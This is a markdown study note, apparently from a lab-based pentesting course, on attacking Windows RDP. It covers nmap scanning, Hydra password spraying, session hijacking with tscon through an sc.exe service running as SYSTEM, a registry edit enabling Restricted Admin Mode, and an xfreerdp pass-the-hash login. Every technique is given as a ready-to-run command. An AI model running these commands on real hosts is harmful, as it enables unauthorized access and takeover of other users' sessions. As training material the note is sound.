# RDP Attack

* a user account will be locked or disabled after a certain number of failed login attempts.
  * In this case, we can perform a specific password guessing technique called \[\[Password Spraying]]
    * Using the Crowbar tool, we can perform a password spraying attack against the RDP service

### Nmap

```bash
nmap -Pn -p3389 192.168.2.143 
```

### Hydra - RDP Password Spraying

```
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

### Crowbar - RDP Password Spraying

* [crowbar.md](crowbar.md "mention")



### RDP Session Hijacking

* if another user is logged in we can hyjack their session
* To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary
  * that enables users to connect to another desktop session

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

* we are logged in as the user `juurena` (UserID = 2) who has `Administrator` privileges.
  * Our goal is to hijack the user `lewen` (User ID = 4), who is also logged in via RDP.

```cmd-session
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

* If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as \[\[PsExec]] or \[\[Mimikatz]]
* A simple trick is to create a Windows service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges
  * We will use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary.
  * First, we specify the service name (`sessionhijack`) and the `binpath`, which is the command we want to execute.
  * Once we run the following command, a service named `sessionhijack` will be created.

```cmd-session
C:\htb> query user
```

```cmd-session
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
```

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```cmd-session
C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

```cmd-session
[SC] CreateService SUCCESS
```

* To run the command, we can start the `sessionhijack` service :

```cmd-session
net start sessionhijack
```

* Once the service is started, a new terminal with the `lewen` user session will appear.
* With this new account, we can attempt to discover what kind of privileges it has on the network
*

    <figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>



    * _Note: This method no longer works on Server 2019._

    ### RDP Pass-the-Hash (PtH)

    * If we have plaintext credentials for the target user, it will be no problem to RDP into the system.
      * However, what if we only have the NT hash of the user obtained from a credential dumping attack such as [SAM](https://en.wikipedia.org/wiki/Security\_Account\_Manager) database, and we could not crack the hash to reveal the plaintext password
      * in some instances, we can perform an RDP PtH attack to gain GUI access to the target system using tools like `xfreerdp`.
      * There are a few caveats to this attack
        * `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:
          *

              <figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>


          * This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG\_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`.&#x20;
            * It can be done using the following command: - `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
            *

                <figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>


            * Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access: - `xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9`
          * If it works, we'll now be logged in via RDP as the target user without knowing their cleartext password.&#x20;



